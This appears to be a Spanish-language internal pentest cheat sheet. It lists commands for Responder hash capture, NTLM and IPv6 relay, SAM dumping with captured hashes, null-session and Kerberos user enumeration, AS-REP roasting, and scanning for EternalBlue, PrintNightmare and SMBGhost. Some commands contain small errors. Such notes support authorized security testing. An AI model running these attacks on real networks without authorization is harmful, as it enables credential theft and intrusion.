---
layout: default
title: Pentest Interno
---

# **Responder**

Modo capturar hashes
```bash
sudo responder -I eth0 -wdF
```

```
ls -la /usr/share/responder/logs
```

Modo relay

```bash
nxc smb ip/24 --gen-relay-list relay.txt
```

```bash
sudo nano /etc/responder/Responder.conf
```

`Ponemos en OFF SMB y HTTP`

```bash
sudo responder -I eth0 -FPv
```

```
sudo impacket-ntlmrelayx.py  -tf relay.txt -smb2support 
```

```bash
nxc smb IP/24 -U USER -H HASH  --local-auth --sam
```

Modo relay IPV6
```bash
sudo python3 mitm6.py -d DOMAIN
```

```bash
impacket-ntlmrelayx -6 -wh 10.17.0.213 -tf formated_relay.txt -socks -debug -smb2support
```

Filtrar por hashes distintos
```bash
ls -la  /usr/share/responder/logs | awk '{print $NF}' | tail -n 15 | xargs cat | grep '::IVI' | sort | uniq
```

Extraer usuarios válidos de los hashes
```bash
cat /usr/share/responder/logs | tr ':' ' ' | awk '{print $1}' | sort | uniq | grep -vE ',|\/|-|#'
```

___

Ver Host activos
```bash
sudo arp-scan -l | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' >> ips.txt
sudo nmap -sn  10.17.0.0/24 -oG - | awk '/Up$/{print $2}' >> ips.txt
cat ips.txt | sort | uniq > ips2.txt
```

smb.txt
```bash
nxc smb -t 10.17.0.0/24 
```

Nmap específico por puertos
```bash
nmap -p 445 10.17.0.0/24 -sS --open -oG - | awk '/445\/open/ {print $2}' > 445.txt
nmap -p 22 10.17.0.0/24 -sS --open -oG - | awk '/22\/open/ {print $2}' > 22.txt
nmap -p 21 10.17.0.0/24 -sS --open -oG - | awk '/21\/open/ {print $2}' > 21.txt
nmap -p 3306 10.17.0.0/24 -sS --open -oG - | awk '/3306\/open/ {print $2}' > 3306.txt
nmap -p 3389 10.17.0.0/24 -sS --open -oG - | awk '/3389\/open/ {print $2}' > 3389.txt
nmap -p 1433 10.17.0.0/24 -sS --open -oG - | awk '/1433\/open/ {print $2}' > 1433.txt
nmap -p 139 10.17.0.0/24 -sS --open -oG - | awk '/139\/open/ {print $2}' > 139.txt
nmap -p 389 10.17.0.0/24 -sS --open -oG - | awk '/389\/open/ {print $2}' > 389.txt
nmap -p 636 10.17.0.0/24 -sS --open -oG - | awk '/636\/open/ {print $2}' > 636.txt
nmap -p 80 10.17.0.0/24 -sS --open -oG - | awk '/80\/open/ {print $2}' > 80.txt
nmap -p 8080 10.17.0.0/24 -sS --open -oG - | awk '/8080\/open/ {print $2}' > 8080.txt
nmap -p 443 10.17.0.0/24 -sS --open -oG - | awk '/443\/open/ {print $2}' > 443.txt
nmap -p 23 10.17.0.0/24 -sS --open -oG - | awk '/23\/open/ {print $2}' > 23.txt
```

SMB null session
```bash
nxc smb 445.txt -u '' -p '' | grep '\[+\]'
nxc smb 445.txt -u '' -p '' --shares
smbmap -u 'null' --host-file smb_null.txt
smbmap -u '' --host-file smb_null.txt
smbclient -L 10.17.0.229 -N
smbclient -L 10.17.0.229 -N -m SMB3
smbclient -L 10.17.0.229 -N -m SMB2
```

RPC null session
```bash
while read ip; do
	echo "Probando null session RPC en $ip "
	rpcclient -U "" $ip -c "enumdomusers" && echo "Null session permitida en $ip" || echo "No null session en $ip"
done < 139.txt
```

```bash
while read ip; do\n  echo "Probando null session RPC en $ip"\n  impacket-lookupsid anonymous@DOMAIN -target-ip $ip -no-pass && echo "Null session permitida en $ip" || echo "No null session en $ip"\ndone < 139.txt
```
 
RDP, comprobar NLA
```bash
nmap -p 3389 -iL 3389.txt --script=rdp-enum-encryption
nxc rdp --nla-screenshot 3389.txt | grep "nla:False"
ls -lh /home/user/.nxc/screenshots/
rdesktop -u "" -p "" IP
```

LDAP probar consultas anónimas
```BASH
ldapsearch -x -H ldap://DOMAIN -s base  -b "" "(objectClass=*)"
ldapsearch -x -H ldap://DOMAIN -s base  -b "DC=,DC=" "(objectClass=*)"
```

Escanear páginas web rápido para saber si están activas

```bash
nmap -p 80 10.17.0.0/24 -sS --open -oG - | awk '/80\/open/ {print $2}' > 80.txt
nmap -p 8080 10.17.0.0/24 -sS --open -oG - | awk '/8080\/open/ {print $2}' > 8080.txt
nmap -p 443 10.17.0.0/24 -sS --open -oG - | awk '/443\/open/ {print $2}' > 443.txt
```

```bash
awk '{print "http://"$0":80"}' 80.txt >> urls.txt
```

```bash
awk '{print "http://"$0":8080"}' 8080.txt >> urls.txt
```

```bash
awk '{print "https://"$0":443"}' 443.txt >> urls.txt
```

```bash
sudo apt install unzip -y
wget https://github.com/projectdiscovery/httpx/releases/download/v1.7.1/httpx_1.7.1_linux_amd64.zip
unzip httpx-linux-amd64.zip
chmod +x httpx-linux-amd64
sudo mv httpx-linux-amd64 /usr/local/bin/httpx

~/go/bin/httpx -l urls.txt -sc -title -t 50 -timeout 5
```

Listado de usuarios válidos
```bash
./kerbrute userenum -d DOMAIN  kerbrute_wordlist.txt 

impacket-GetNPUsers DOMAIN/ -no-pass -usersfile valid_users.txt -dc-ip IP
```
Wordlist para hacer password spraying
https://github.com/attackdebris/kerberos_enum_userlists.git

___

Listar software vulnerable, primero hacer un nmap targeted, después:

mssql
```bash
cat mssql_targeted | grep -E 'Nmap scan report|name: |number: ' | grep -v 'Instance' > vulnerable_mssql.txt
```

22.txt
```bash
awk '/Nmap scan report for/ {ip=$NF} /tcp/ && /open/ && /ssh/ {print ip, substr($0, index($0, $4))}' 22_targeted 
```

___

# Puertos típicos

| Puerto        | Servicio común        | Riesgos frecuentes / Exploits conocidos                             |
| ------------- | --------------------- | ------------------------------------------------------------------- |
| **21**        | FTP                   | Contraseñas en texto plano, anon login, RCE (vsftpd backdoor, etc.) |
| **22**        | SSH                   | Bruteforce, versiones viejas de OpenSSH (7.x, 8.x) con CVEs         |
| **23**        | Telnet                | Texto plano, acceso sin cifrar, default creds                       |
| **25**        | SMTP                  | Relay abierto, RCE por buffer overflow                              |
| **53**        | DNS                   | Cache poisoning, DoS, zone transfer                                 |
| **80**        | HTTP                  | Web vulns (LFI, RCE, XSS, SQLi), paneles sin auth                   |
| **110**       | POP3                  | Texto plano, credenciales expuestas                                 |
| **135**       | RPC                   | Windows RCE (MS03-026, DCOM, etc.)                                  |
| **139**       | NetBIOS               | Enumeración, ataques LLMNR/NetBIOS                                  |
| **143**       | IMAP                  | Texto plano, default creds                                          |
| **389**       | LDAP                  | Enumeración, credenciales en texto plano                            |
| **445**       | SMB                   | MS17-010 (EternalBlue), RCE, cred capture (Responder)               |
| **512-514**   | R* services           | RSH/Rlogin inseguros                                                |
| **3306**      | MySQL                 | Default creds, inyecciones                                          |
| **3389**      | RDP                   | Bruteforce, BlueKeep (CVE-2019-0708), cred reuse                    |
| **5432**      | PostgreSQL            | Default users, inyecciones SQL                                      |
| **5900**      | VNC                   | Sin autenticación, acceso completo                                  |
| **5985/5986** | WinRM                 | RCE si hay credenciales disponibles                                 |
| **8000-9000** | Web apps/dev services | Jenkins, Tomcat, Jupyter, etc. → muchos sin auth por defecto        |
| **9200**      | Elasticsearch         | RCE, info leak si sin auth                                          |
| **11211**     | Memcached             | Amplification DDoS                                                  |

# Vuns típicas

| Nombre             | CVE            | Servicio              | Descripción                                          | Explotable en Metasploit                           |
| ------------------ | -------------- | --------------------- | ---------------------------------------------------- | -------------------------------------------------- |
| **EternalBlue**    | CVE-2017-0144  | SMBv1 (445)           | RCE por buffer overflow en SMBv1 (Win7, Win2008, XP) | ✅ Sí (exploit/windows/smb/ms17_010_eternalblue)    |
| **SMBGhost**       | CVE-2020-0796  | SMBv3 (445)           | RCE en SMBv3.1.1 (Windows 10/2019)                   | ✅ (scripts y PoCs)                                 |
| **BlueKeep**       | CVE-2019-0708  | RDP (3389)            | RCE en Remote Desktop (Win7/Server 2008)             | ✅ (exploit/windows/rdp/cve_2019_0708_bluekeep_rce) |
| **PrintNightmare** | CVE-2021-34527 | RPC/Spooler (135/445) | RCE por falla en spooler                             | ✅ (exploit/windows/local/printnightmare)           |

Escáneres :

```bash
nxc smb 10.17.0.0/24 -M eternalblue
```

```bash
nxc smb 10.17.0.0/24 -M printnightmare
```

```bash
nxc smb 10.17.0.0/24 -M smbghost
```